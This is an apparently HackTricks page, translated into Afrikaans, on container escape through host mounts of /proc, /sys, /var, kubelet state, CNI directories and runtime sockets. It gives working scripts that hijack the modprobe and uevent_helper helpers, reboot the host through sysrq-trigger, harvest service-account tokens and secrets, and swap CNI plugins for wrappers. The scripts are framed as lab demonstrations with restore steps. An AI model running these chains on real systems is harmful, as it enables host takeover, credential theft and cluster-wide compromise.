# Sensitiewe Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Host mounts is een van die belangrikste praktiese container-escape-oppervlaktes omdat hulle dikwels 'n noukeurig geïsoleerde process view terugverander na direkte sigbaarheid van host-hulpbronne. Die gevaarlike gevalle is nie beperk tot `/` nie. Bind mounts van `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state of device-related paths kan kernel-kontroles, credentials, aangrensende container-lêerstelsels en runtime management interfaces blootstel.

Hierdie bladsy bestaan apart van die individuele protection pages omdat die abuse model oor verskeie areas strek. 'n Writable host mount is deels gevaarlik weens mount namespaces, deels weens user namespaces, deels weens AppArmor- of SELinux-dekking, en deels weens watter presiese host path blootgestel is. Deur dit as 'n eie onderwerp te behandel, word die attack surface baie makliker om te ontleed.

## `/proc`-blootstelling

procfs bevat beide gewone process-inligting en kernel control interfaces met 'n groot impak. 'n Bind mount soos `-v /proc:/host/proc` of 'n container view wat onverwagte writable proc entries blootstel, kan daarom tot information disclosure, denial of service of direkte host code execution lei.

Hoëwaarde-procfs-paaie sluit in:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (veral `register` en `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Begin deur te kontroleer watter hoëwaarde-procfs-entries sigbaar of writable is:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Hierdie paaie is om verskillende redes interessant. `core_pattern`, `modprobe` en `binfmt_misc` kan host code-execution-paaie word wanneer hulle skryfbaar is. `kallsyms`, `kmsg`, `kcore` en `config.gz` is kragtige reconnaissance-bronne vir kernel exploitation. `sched_debug` en `mountinfo` onthul proses-, cgroup- en filesystem-konteks wat kan help om die host-uitleg vanuit die container te rekonstrueer.

Die praktiese waarde van elke pad verskil, en om hulle almal te behandel asof hulle dieselfde impak het, maak triage moeiliker:

- `/proc/sys/kernel/core_pattern`
Indien skryfbaar, is dit een van die procfs-paaie met die hoogste impak omdat die kernel ’n pipe-handler ná ’n crash sal uitvoer. ’n Container wat `core_pattern` na ’n payload kan wys wat in sy overlay of in ’n gemounte host-pad gestoor is, kan dikwels host code execution verkry. Sien ook [read-only-paths.md](protections/read-only-paths.md) vir ’n toegewyde voorbeeld.
- `/proc/sys/kernel/modprobe`
Hierdie pad beheer die userspace-helper wat deur die kernel gebruik word wanneer dit module-loading-logika moet aanroep. Indien dit vanuit die container skryfbaar is en in die host-konteks geïnterpreteer word, kan dit nog ’n host code-execution-primitive word. Dit is veral interessant wanneer dit gekombineer word met ’n manier om die helper-pad te trigger.
- `/proc/sys/vm/panic_on_oom`
Dit is gewoonlik nie ’n skoon escape-primitive nie, maar dit kan memory pressure in host-wye denial of service omskep deur OOM-toestande in kernel-panic-gedrag te verander.
- `/proc/sys/fs/binfmt_misc`
Indien die registrasie-koppelvlak skryfbaar is, kan die attacker ’n handler vir ’n gekose magic value registreer en host-context execution verkry wanneer ’n ooreenstemmende lêer uitgevoer word.
- `/proc/config.gz`
Nuttig vir kernel exploit triage. Dit help bepaal watter subsystems, mitigations en opsionele kernel-features geaktiveer is sonder dat host package-metadata nodig is.
- `/proc/sysrq-trigger`
Hoofsaaklik ’n denial-of-service-pad, maar ’n baie ernstige een. Dit kan die host onmiddellik reboot, laat panic of andersins ontwrig.
- `/proc/kmsg`
Onthul kernel ring buffer-boodskappe. Nuttig vir host fingerprinting, crash analysis en in sommige omgewings vir die leaking van inligting wat nuttig is vir kernel exploitation.
- `/proc/kallsyms`
Waardevol wanneer dit leesbaar is omdat dit exported kernel symbol-inligting blootstel en kan help om address-randomization-aannames tydens kernel exploit development te omseil.
- `/proc/[pid]/mem`
Dit is ’n direkte process-memory-koppelvlak. Indien die teikenproses bereikbaar is met die nodige ptrace-style conditions, kan dit die lees of wysiging van ’n ander proses se memory toelaat. Die realistiese impak hang sterk af van credentials, `hidepid`, Yama en ptrace restrictions, dus is dit ’n kragtige maar conditional pad.
- `/proc/kcore`
Blootstel ’n core-image-style-aansig van system memory. Die lêer is enorm en lomp om te gebruik, maar indien dit betekenisvol leesbaar is, dui dit op ’n swak blootgestelde host-memory-oppervlak.
- `/dev/kmem` en `/dev/mem`
Hierdie is historiese raw-memory **device**-koppelvlakke met ’n hoë impak, nie procfs-lêers nie. Op baie moderne stelsels is hulle afwesig of sterk beperk, maar ’n container wat ’n host-gemounte kopie kan oopmaak, moet die blootstelling as krities beskou. Hersien hulle saam met ander sensitiewe `/dev`-mounts eerder as om na die niebestaande `/proc/kmem`- of `/proc/mem`-paaie te soek.
- `/proc/sched_debug`
Leaken scheduling- en task-inligting wat host-prosesidentiteite kan blootstel, selfs wanneer ander proses-aansigte skoner lyk as wat verwag is.
- `/proc/[pid]/mountinfo`
Uiters nuttig om te rekonstrueer waar die container werklik op die host geleë is, watter paaie deur overlay ondersteun word, en of ’n skryfbare mount met host-inhoud of slegs met die container-laag ooreenstem.

Indien `/proc/[pid]/mountinfo` of overlay-besonderhede leesbaar is, gebruik hulle om die host-pad van die container-filesystem te herwin:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Hierdie opdragte is nuttig omdat ’n aantal host-execution-truuks vereis dat ’n pad binne die container omgeskakel word na die ooreenstemmende pad vanuit die host se perspektief.

### Voorbeeld: Voorbereiding van ’n `modprobe`-helperpad

As `/proc/sys/kernel/modprobe` skryfbaar is vanuit die container en die helperpad in die host-konteks geïnterpreteer word, kan dit na ’n aanvaller-beheerde payload herlei word. Die overlay upper-gids moet vanaf die host opgelos word, en bewysuitset moet teruggeskryf word na dieselfde host-sigbare container-laag as die container nie ook die host se `/tmp` mount nie:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
Die presiese sneller hang van die teiken en kernel se gedrag af en word doelbewus nie geraai nie. Herstel die oorspronklike waarde voordat jy die lab verlaat. Die belangrike punt is dat ’n writable helper path ’n toekomstige kernel helper invocation kan herlei na attacker-controlled host-path content. ’n Ontbrekende overlay `upperdir`, ’n path wat die host nie kan resolve nie, ’n read-only sysctl mount, of ’n kernel wat nooit die geselekteerde helper invoke nie, verbreek hierdie ketting.

### Volledige Example: Kernel Recon Met `kallsyms`, `kmsg` En `config.gz`

As die doel exploitability assessment eerder as onmiddellike escape is:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Hierdie opdragte help om te bepaal of nuttige simboolinligting sigbaar is, of onlangse kernel-boodskappe interessante toestand openbaar, en watter kernel-kenmerke of mitigations ingesluit is. Die impak is gewoonlik nie ’n direkte escape nie, maar dit kan kernel-vulnerability triage aansienlik verkort.

### Volledige voorbeeld: SysRq Host Reboot

As `/proc/sysrq-trigger` skryfbaar is en die host-aansig bereik:
```bash
echo b > /proc/sysrq-trigger
```
Die effek is ’n onmiddellike herlaai van die host. Dit is nie ’n subtiele voorbeeld nie, maar dit demonstreer duidelik dat procfs-blootstelling baie ernstiger kan wees as bloot inligtingblootstelling.

## `/sys`-blootstelling

sysfs stel groot hoeveelhede kernel- en device-state bloot. Sommige sysfs-paaie is hoofsaaklik nuttig vir fingerprinting, terwyl ander helper execution, device-gedrag, security-module-konfigurasie of firmware-state kan beïnvloed.

Hoëwaarde-sysfs-paaie sluit in:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Hierdie paaie is om verskillende redes belangrik. `/sys/class/thermal` kan thermal-management-gedrag beïnvloed en gevolglik host-stabiliteit in swak blootgestelde omgewings benadeel. `/sys/kernel/vmcoreinfo` kan crash-dump- en kernel-layout-inligting lek wat help met laevlak-host-fingerprinting. `/sys/kernel/security` is die `securityfs`-interface wat deur Linux Security Modules gebruik word, dus kan onverwagte toegang daar MAC-verwante state blootstel of verander. EFI-variable-paaie kan firmware-gesteunde boot settings beïnvloed, wat dit baie ernstiger maak as gewone konfigurasielêers. `debugfs` onder `/sys/kernel/debug` is besonder gevaarlik omdat dit doelbewus ’n developer-georiënteerde interface is met baie minder veiligheidsverwagtinge as geharde kernel-API’s wat vir produksie bedoel is.

Elke sysfs-entry in hierdie lys is **afhanklik van die kernel, konfigurasie en hardware**. Huidige gevirtualiseerde nodes laat gewoonlik `uevent_helper`, EFI-variables en thermal-device entries heeltemal weg. Noteer ’n ontbrekende pad as ’n negatiewe voorvereiste, eerder as om aan te neem dat ’n voorbeeld van ’n ander kernel van toepassing is.

Nuttige review commands vir hierdie paaie is:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Wat maak hierdie opdragte interessant:

- `/sys/kernel/security` kan onthul of AppArmor, SELinux, of ’n ander LSM-oppervlak sigbaar is op ’n manier wat slegs op die host moes gebly het.
- `/sys/kernel/debug` is dikwels die kommerwekkendste bevinding in hierdie groep. As `debugfs` gemount en leesbaar of skryfbaar is, verwag ’n breë kernel-gerigte oppervlak waarvan die presiese risiko van die geaktiveerde debug-nodes afhang.
- Blootstelling van EFI-veranderlikes kom minder algemeen voor, maar het ’n groot impak omdat dit firmware-gesteunde instellings raak eerder as gewone runtime-lêers.
- `/sys/class/thermal` is hoofsaaklik relevant vir host-stabiliteit en hardeware-interaksie, nie vir ’n netjiese shell-styl escape nie.
- `/sys/kernel/vmcoreinfo` is hoofsaaklik ’n bron vir host-fingerprinting en crash-analise, nuttig om laevlak-kerneltoestand te verstaan.

### Volledige voorbeeld: `uevent_helper`

`/sys/kernel/uevent_helper` is afhanklik van die kernel en konfigurasie en ontbreek op baie huidige stelsels. As dit bestaan, skryfbaar is, en ’n bruikbare `uevent`-trigger beskikbaar is, kan die kernel ’n aanvaller-beheerde helper uitvoer. Bewysuitset moet ’n pad gebruik wat vanuit beide die host- en container-aansigte sigbaar is:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
Die rede waarom dit werk, is dat die helper-pad vanuit die host se perspektief geïnterpreteer word. Sodra dit geaktiveer word, loop die helper in die host-konteks eerder as binne die huidige container. `/sys/class/mem/null/uevent` is een konkrete trigger op kernels wat dit beskikbaar stel; ander devices kan hul eie `uevent`-lêers beskikbaar stel, maar moenie een blindelings op werklike hardware kies nie. Herstel die oorspronklike waarde voordat jy die lab verlaat. Moenie hierdie tegniek as beskikbaar rapporteer wanneer die helper-lêer of ’n beheerde trigger ontbreek nie.

## `/var`-blootstelling

Die mounting van die host se `/var` in ’n container word dikwels onderskat omdat dit nie so dramaties soos die mounting van `/` lyk nie. In die praktyk kan dit genoeg wees om toegang te verkry tot runtime sockets, container snapshot directories, kubelet-bestuurde pod volumes, geprojekteerde service-account tokens en naburige application filesystems. Op moderne nodes is `/var` dikwels waar die mees operasioneel interessante container-state werklik geleë is.

### Kubernetes-voorbeeld

’n Pod met `hostPath: /var` kan dikwels ander pods se geprojekteerde tokens en overlay snapshot-inhoud lees:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Hierdie commands is nuttig omdat hulle aandui of die mount slegs onbeduidende application data blootstel, of credentials met ’n groot impak op die cluster. ’n Leesbare service-account token kan plaaslike code execution onmiddellik in Kubernetes API access omskep.

As die token teenwoordig is, valideer waartoe dit access het eerder as om by token discovery te stop:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Die impak hier kan veel groter wees as toegang tot die plaaslike node. ’n token met breë RBAC kan ’n gemounte `/var` in ’n kompromittering van die hele cluster omskep.

### Docker- en containerd-voorbeeld

Op Docker hosts is die relevante data dikwels onder `/var/lib/docker`, terwyl dit op containerd-backed Kubernetes-nodes onder `/var/lib/containerd` of snapshotter-specific paths kan wees:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
As die gemounte `/var` skryfbare snapshot-inhoud van ’n ander workload blootstel, kan die aanvaller moontlik toepassingslêers wysig, webinhoud plant, of opstartscripts verander sonder om aan die huidige container-konfigurasie te raak.

Op ’n **disposable lab workload** kan skryfbare snapshot-inhoud toepassingsmanipulasie, secret-herwinning of lateral movement demonstreer. Koppel eers die runtime container ID aan die presiese snapshot en moet nooit ’n onverwante of produksie-snapshot wysig nie:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Hierdie opdragte is nuttig omdat hulle die drie hoofimpakfamilies van gemounte `/var` toon: toepassingsmanipulasie, geheimherwinning en laterale beweging na naburige workloads.

Direkte snapshot-skrywings omseil die runtime se normale toestandsbestuur en kan die container korrupteer of bewyse vernietig. Leesalleen-ontdekking is plaaslik teen Docker `overlay2` herhaal: ’n merker wat in ’n naburige weggooibare container geskryf is, het onder `/var/lib/docker/overlay2/<id>/diff/` verskyn. Beperk werklike snapshot-wysiging tot ’n weggooibare container wat vir daardie toets geskep is.

## Kubelet State, Plugins, And CNI Paths

’n Mount van `/var/lib/kubelet`, `/opt/cni/bin` of `/etc/cni/net.d` word dikwels deur bevoorregte DaemonSets, CNI-agente, CSI-node-plugins, GPU-operateurs en storage helpers blootgestel. Hierdie mounts word maklik as "node plumbing" afgemaak, maar hulle lê direk in die uitvoeringspad vir nuwe pods en bevat dikwels kubelet credentials, projected secrets, registrasie-sockets en uitvoerbare plugin binaries aan die host-kant.

Teikens met ’n hoë waarde sluit in:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nuttige hersieningsopdragte is:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Waarom hierdie paaie saak maak:

- `/var/lib/kubelet/pki` kan kubelet-kliëntsertifikate en ander node-local credentials blootstel wat soms teen die API server of kubelet-facing TLS endpoints hergebruik kan word, afhangend van die cluster-ontwerp.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` bevat dikwels geprojekteerde service-account tokens en gemounte Secrets vir naburige pods op dieselfde node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` is hoofsaaklik ’n reconnaissance-oppervlak, maar ’n baie nuttige een: dit onthul watter pods en containers tans GPUs, hugepages, SR-IOV-devices en ander skaars node-local resources besit.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` en `/var/lib/kubelet/plugins_registry` onthul watter CSI-, DRA- en device plugins geïnstalleer is en met watter sockets die kubelet na verwagting moet kommunikeer. As daardie directories writable eerder as bloot readable is, word die finding baie ernstiger.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` en `/etc/cni/net.d` is direk op die pod-network-opstellingspad. Writable access daar is dikwels ’n vertraagde host-execution primitive eerder as bloot configuration exposure.<sup>[[2]](#references)</sup>

### Volledige voorbeeld: Writable `/opt/cni/bin`

As ’n host CNI binary directory read-write gemount is, kan die vervanging van ’n plugin genoeg wees om host execution te verkry die volgende keer wanneer die kubelet ’n pod sandbox op daardie node skep:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Dit is nie so onmiddellik soos ’n gemonteerde `docker.sock` nie, maar dit is dikwels meer realisties in gekompromitteerde Kubernetes-infrastruktuur-Pods. Die merker word langs die gemonteerde plugin geskryf sodat die container dit kan terugkry, selfs sonder ’n host-root- of host-`/tmp`-mount. Die wrapper behou die oorspronklike argumente en standaardinvoer, waarna die voorbeeld die oorspronklike binary herstel. Die belangrike punt is dat die aangepaste binary later deur die host se netwerkopstellingsvloei uitgevoer word, nie deur die huidige container nie. Gebruik slegs ’n weggooibare node, want ’n ongeldige wrapper kan verhoed dat nuwe Pod-sandboxes netwerkverbinding ontvang.

## Runtime Sockets

Sensitiewe host-mounts sluit dikwels runtime-sockets eerder as volledige directories in. Hulle is so belangrik dat dit die moeite werd is om dit hier uitdruklik te herhaal:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Sien [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) vir volledige exploitation flows sodra een van hierdie sockets gemount is.

As ’n vinnige eerste interaksiepatroon:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
If een van hierdie slaag, is die pad van "mounted socket" na "start a more privileged sibling container" gewoonlik baie korter as enige kernel breakout-pad.

## Writable Host Path Task Hijack

’n Writable host mount hoef nie `/` bloot te stel om gevaarlik te wees nie. As die gemounte pad scripts, config files, hooks, plugins of files bevat wat later deur ’n host-side scheduled task of service gebruik word, kan die container moontlik verander wat die host uitvoer.

Generic review flow:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
As ’n writable file deur ’n host process gebruik word, hou die payload eenvoudig en maklik waarneembaar tydens toetsing:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Die interessante deel is die trust boundary: die skryfaksie gebeur van binne die container, maar uitvoering gebeur later in die host service-konteks. Dit verander ’n beperkte hostPath of bind mount in ’n delayed host-code-execution primitive.

## CVE's wat met mounts verband hou

Host mounts hou ook verband met runtime-kwesbaarhede. Belangrike onlangse voorbeelde sluit in:

- `CVE-2024-21626` in `runc`, waar ’n gelekte directory file descriptor die working directory op die host filesystem kon plaas.
- `CVE-2024-23651`, `CVE-2024-23652` en `CVE-2024-23653` in BuildKit, waar kwaadwillige Dockerfiles, frontends en `RUN --mount`-flows host file access, deletion of elevated privileges tydens builds kon herinstel.
- `CVE-2024-1753` in Buildah- en Podman-build-flows, waar crafted bind mounts tydens ’n build `/` read-write kon blootstel.
- `CVE-2025-47290` in `containerd` 2.1.0, waar ’n TOCTOU tydens image unpack ’n specially crafted image kon toelaat om die host filesystem tydens pull te wysig.

Hierdie CVE's is hier belangrik omdat hulle wys dat mount handling nie net oor operator configuration gaan nie. Die runtime self kan ook mount-driven escape conditions veroorsaak.

## Checks

Gebruik hierdie commands om die mount exposures met die hoogste waarde vinnig op te spoor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Wat hier interessant is:

- Host root, `/proc`, `/sys`, `/var` en runtime sockets is almal hoëprioriteit-bevindings.
- Skryfbare proc/sys-inskrywings beteken dikwels dat die mount host-globale kernelkontroles blootstel eerder as ’n veilige container-aansig.
- Gemonteerde `/var`-paaie verdien ’n hersiening van credentials en naburige workloads, nie net ’n lêerstelsel-hersiening nie.
- Kubelet-staatgidse en CNI/plugin-paaie verdien dieselfde prioriteit as runtime sockets, omdat hulle dikwels direk op die node se pod-skeppings- en credential-verspreidingspad lê.

## Plaaslike Validasiestatus

Die praktiese kettings op hierdie bladsy is teen ’n plaaslike Linux minikube-node nagegaan. Die validasie het die volgende gereproduseer:

- lees- en skryftoegang deur ’n tydelike skryfbare hostPath
- opsporing van geprojekteerde ServiceAccount-tokens en gemonteerde Secrets deur `/var/lib/kubelet/pods`
- suksesvolle Kubernetes API-authentisering met ’n aktiewe token wat uit daardie gemonteerde kubelet-staat herwin is
- leesalleen-ontdekking van ’n naburige Docker `overlay2`-lêerstelsel deur gemonteerde `/var`
- Docker API-skepping van ’n sibling container met ’n leesalleen-host bind deur ’n gemonteerde `docker.sock`
- vertraagde host-uitvoering deur ’n tydelike host-verbruikte hook
- ’n CNI-wrapper-simulasie wat die oorspronklike plugin se argumente, standaardinvoer en uitvoering behou het

Dieselfde node het `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` en `config.gz` blootgestel, maar dit het nie `uevent_helper`, EFI-veranderlikes, termiese inskrywings of `sched_debug` blootgestel nie. Destruktiewe kernel-triggers is nie uitgevoer nie. Dit bevestig dat host-root-, `/var`-, kubelet-staat-, socket- en host-verbruikerskettings reproduseerbaar is, terwyl procfs/sysfs-helpertegnieke voorwaardelik moet bly op grond van die presiese kernel, mount-modus, payload-pad en trigger.

## References

- [1] [Plaaslike lêers en paaie wat deur die Kubelet gebruik word](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent-container kan toegang tot die host verkry via `hostPath`-mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
